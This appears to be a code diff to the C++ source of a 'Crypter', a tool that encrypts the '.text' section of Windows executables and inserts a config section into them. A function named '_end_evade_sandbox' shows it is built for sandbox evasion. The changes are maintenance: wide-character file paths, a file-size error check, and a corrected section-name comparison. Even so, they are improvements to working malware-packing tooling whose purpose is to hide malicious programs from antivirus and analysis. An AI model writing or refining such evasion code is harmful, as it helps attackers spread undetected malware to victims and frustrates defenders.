@@ -132,7 +132,7 @@ __declspec(naked) int _end_evade_sandbox(void)
 	__asm ret 8
 }
 
-bool Crypter::crypt(const char *infile, const char *outfile){
+bool Crypter::crypt(const wchar_t *infile, const wchar_t *outfile){
 	// variables
 
 	DWORD dwOldProt, bytes;
@@ -144,6 +144,9 @@ bool Crypter::crypt(const char *infile, const char *outfile){
 		return false;
 	}
 	DWORD dwFileSize = GetFileSize(hFile, 0);
+	if (dwFileSize == INVALID_FILE_SIZE){
+		return false;
+	}
 
 	// load in memory
 	LPBYTE fileBuffer = (LPBYTE) malloc(dwFileSize);
@@ -167,7 +170,7 @@ bool Crypter::crypt(const char *infile, const char *outfile){
 
 	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER) SECHDROFFSET(fileBuffer);
 #define TEXT_SECTION ".text"
-	while(memcmp(sectionHeader->Name, TEXT_SECTION, strlen(TEXT_SECTION))) // get the ".text" section header
+	while(memcmp(sectionHeader->Name, TEXT_SECTION, strlen(TEXT_SECTION) + 1)) // get the ".text" section header
 		sectionHeader++;
 
 	DWORD dwVSize                  = sectionHeader->Misc.VirtualSize; // the virtual size of the section, later this will be used as chunksize in our stub, after proper alignment
@@ -413,7 +416,7 @@ BOOL Crypter::insertSectionConfigInPE(PVOID pvPEBase,DWORD dwPESize,PVOID pvData
 	return bRet;
 }
 
-bool Crypter::saveFile(const char* nameFile, char* data, int sz ){
+bool Crypter::saveFile(const wchar_t* nameFile, char* data, int sz ){
 	HANDLE fout = CreateFile(nameFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
 	if (fout == INVALID_HANDLE_VALUE) {
 		return false;
